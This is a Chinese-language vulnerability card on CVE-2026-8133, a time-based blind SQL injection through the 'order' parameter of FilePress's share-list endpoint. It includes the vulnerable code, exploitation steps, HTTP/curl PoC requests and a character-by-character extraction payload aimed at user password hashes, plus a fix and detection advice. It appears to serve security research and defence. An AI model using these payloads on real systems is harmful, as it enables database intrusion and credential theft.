---
id: web-generic-sqli-filepress-order-orderby-time-blind
title: FilePress 分享列表 order 参数 ORDER BY 时间盲注：邻近参数漏加白名单（CVE-2026-8133）
type: scenario
domain: web
path: web/generic/sqli
technique: filepress-order-orderby-time-blind
aliases:
- CVE-2026-8133
- GHSA-pxqj-577f-7xfv
- FilePress SQL 注入
- DZZ 框架 ORDER BY 注入
- 邻近参数漏修
- filelist order 注入
tags:
- php
- filepress
- dzz
- sqli
- order-by
- time-blind
- subquery
- cve-2026-8133
cve:
- CVE-2026-8133
severity: high
confidence: high
status: verified
affected_versions: 'FilePress ≤ 2.2.0（CVE 披露）；原文复现环境为 FilePress 3.0.1（Gitee zyx0814/FilePress），修复于 PR #71 / commit e20ec584'
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:10:05+08:00'
  notes: 已对照原文与6张截图核对：dzz/shares/ajax.php 只对 orderby 白名单、order 直接拼接；截图03基线1067ms、04注入SLEEP(10)为11058ms且响应数据不变，确认ORDER BY时间盲注；版本矛盾（CVE称<=2.2.0、复现3.0.1）及CVE称Pre-Auth但实测需登录，卡内均已如实注明。PoC未自行执行。
---

## 一句话结论

FilePress 的分享文件列表接口把 GET 参数 `order` 直接拼进 `ORDER BY dateline $order`，开发者只对相邻的 `orderby` 做了 `in_array()` 白名单却漏掉了 `order`；已登录（乃至可构造匿名分享）的攻击者可用 `order=desc,(SELECT 1 FROM (SELECT SLEEP(3)) t)` 制造时间盲注，逐字符提取数据库结构、用户凭据等数据。

## 原理

- 漏洞文件 `dzz/shares/ajax.php`：
  ```php
  $order = isset($_GET['order']) ? trim($_GET['order']) : 'desc';
  // 缺失：if (!in_array($order, array('desc','asc'), true)) $order = 'desc';
  $orderby = 'dateline';
  $ordersql = "order by $orderby $order";     // 注入点：$order 直接拼接
  ```
  随后：
  ```php
  DB::fetch_all("select id from %t where $wheresql $ordersql $limitsql", $params)
  ```
  `%t` 表名与 WHERE 值通过 `$params` 安全替换，但 ORDER BY 子句在参数化之前已拼接完成。
- 为什么 ORDER BY 必须白名单：SQL 标准不允许在 ORDER BY 位置使用 `?`/`:param` 占位符，列名/表达式必须由应用构造；DZZ 的 `DB::fetch_all()` 无法替应用校验，开发者必须自己限制可接受值。
- 漏洞成因是“邻近参数漏修”：同一接口对 `orderby` 做了 `in_array()` 白名单，`order` 紧邻其旁却被遗漏；代码审阅者看到 `orderby` 已校验，容易误以为排序相关参数都已处理。
- 注入点位于 ORDER BY，UNION 语法上不可行；返回数据顺序受排序影响，布尔盲注不稳定；因此时间盲注（SLEEP 子查询）是最可靠的验证方式。MySQL 会在结果集每一行执行一次 ORDER BY 中的子查询，产生可测量的延迟。
- 认证边界：代码用 `$_G['uid']` 判断登录态，`uid=0` 时查询 `WHERE uid=0`；CVE 描述为 Pre-Auth，但实测核心注入点需要有效登录会话（任意注册用户即可，无特殊权限）。匿名用户可通过 `shareAddSubmit` + `stype=3` 创建分享记录，使 `uid=0` 的查询有匹配数据，从而满足注入执行条件。

## 触发条件

- FilePress 受影响版本（原文 CVE 披露 ≤ 2.2.0；复现环境 3.0.1，修复于 PR #71）。
- `index.php?mod=shares&op=ajax&do=filelist` 端点可达。
- 有效登录会话（任意注册用户）或能通过匿名分享让 `uid` 对应查询有匹配记录。
- 目标数据库为 MySQL，`SLEEP()` 可用；`information_schema` 可读（默认）。
- 表中至少有匹配 `uid` 的分享记录，否则 ORDER BY 子查询不会执行。
- 未在网关/应用层对 `order` 做白名单或关键字过滤。

## 利用步骤

1. 注册/登录 FilePress，获取含 `oaooa_2132_sid` 等 Cookie 的会话；若走匿名路径，先用 `shareAddSubmit` + `stype=3` 创建分享记录。
2. 发送基线请求 `GET /filepress/index.php?mod=shares&op=ajax&do=filelist`，记录响应时间（原文约 0.14–1s）。
3. 加注入参数 `order=desc,(SELECT 1 FROM (SELECT SLEEP(3)) t)`，观察响应延迟约 3 秒，确认注入。
4. 用 `IF(ASCII(SUBSTRING(...))>N, SLEEP(3), 0)` 二分提取数据库名、表名、列名、用户数据。
5. 提取 `dzz_user` 表的用户名、密码哈希（`md5(md5(pwd)+salt)`）、邮箱；如 MySQL 有 FILE 权限，可尝试 `LOAD_FILE()` 读文件。
6. 用同一 MySQL 实例中的跨库查询扩大影响。

## PoC

基线：

```http
GET /filepress/index.php?mod=shares&op=ajax&do=filelist HTTP/1.1
Host: target:9983
Cookie: oaooa_2132_sid=<session>
```

时间盲注验证：

```http
GET /filepress/index.php?mod=shares&op=ajax&do=filelist&order=desc,(SELECT+1+FROM+(SELECT+SLEEP(10))+t) HTTP/1.1
Host: target:9983
Cookie: oaooa_2132_sid=<session>
```

```bash
# 基线 vs 注入计时对比
time curl -s -b cookies.txt \
  "http://target:9983/filepress/index.php?mod=shares&op=ajax&do=filelist"
time curl -s -b cookies.txt \
  "http://target:9983/filepress/index.php?mod=shares&op=ajax&do=filelist&order=desc,(SELECT+1+FROM+(SELECT+SLEEP(3))+t)"
```

数据提取（逐字符）：

```text
order=desc,(SELECT IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),1,1))>64,SLEEP(3),0))
```

拼接后的 SQL：

```sql
SELECT id FROM dzz_pichome_share WHERE uid = 1
ORDER BY dateline desc,(SELECT 1 FROM (SELECT SLEEP(3)) t)
LIMIT 0,10
```

实测：基线约 140ms / 1,067ms，`SLEEP(10)` 注入约 11,058ms；响应体与基线一致（注入不改变返回数据）。

## 变体与关联

- 变体（参数名）：其他把 `order`/`sort`/`sortField` 直接拼进 ORDER BY 的列表接口，均可套用同一时间盲注。
- 变体（方向/列名分离）：若同时校验了列名而漏了方向，或反之，都可从遗漏的一侧注入；审计时要成对检查 `orderby` 与 `order`、`sort` 与 `direction`。
- 变体（数据库）：MySQL 用 `SLEEP`/`BENCHMARK`；PostgreSQL 用 `pg_sleep`；SQL Server 用 `WAITFOR DELAY`。
- 关联：[[web-generic-sqli-craft-commerce-sort-orderby-time-blind]]（另一 PHP 应用 ORDER BY 时间盲注，同为标识符位置无法参数化 + 白名单缺失）。
- 关联：[[web-generic-sqli-java-identifier-table-order-by-injection]]（同类通用原理）。
- 边界：需要登录或可构造匿名分享；UNION 在 ORDER BY 位置不可用；`SELECT ... INTO OUTFILE` 需 FILE 权限，默认多无此权限。

## 检测与防御

- 修复：升级到包含 PR #71 / commit `e20ec584` 的版本；在 `order` 赋值后加：
  ```php
  if (!in_array($order, array('desc', 'asc'), true)) $order = 'desc';
  ```
- 热修复：对 `orderby` 用列名白名单、对 `order` 用 `asc/desc` 白名单，两者都必须校验。
- 通用模板：
  ```php
  $allowed_columns = array('id', 'title', 'dateline', 'size');
  $allowed_directions = array('asc', 'desc');
  $orderby = in_array($_GET['orderby'], $allowed_columns, true) ? $_GET['orderby'] : 'dateline';
  $order = in_array(strtolower($_GET['order'] ?? ''), $allowed_directions, true) ? strtolower($_GET['order']) : 'desc';
  $sql .= " ORDER BY `$orderby` $order";
  ```
- 加固：所有动态 ORDER BY/GROUP BY/LIMIT 一律白名单映射；不要依赖引号或转义。
- 检测：审计 PHP 中 `$_GET['order']`、`$_GET['orderby']`、`$_REQUEST['sort']` 直接拼接；搜索 `order by $` 且邻近缺少 `in_array` 的代码。
- 检测：请求中 `order`/`sort` 含逗号、括号、`SELECT`、`SLEEP`、`IF(`、`BENCHMARK`；列表接口响应时间异常；`information_schema` 相关子查询特征。
- 检测：同一会话短时间内对 `filelist` 的大量请求且响应时间呈阶梯/二分模式，符合时间盲注提取。
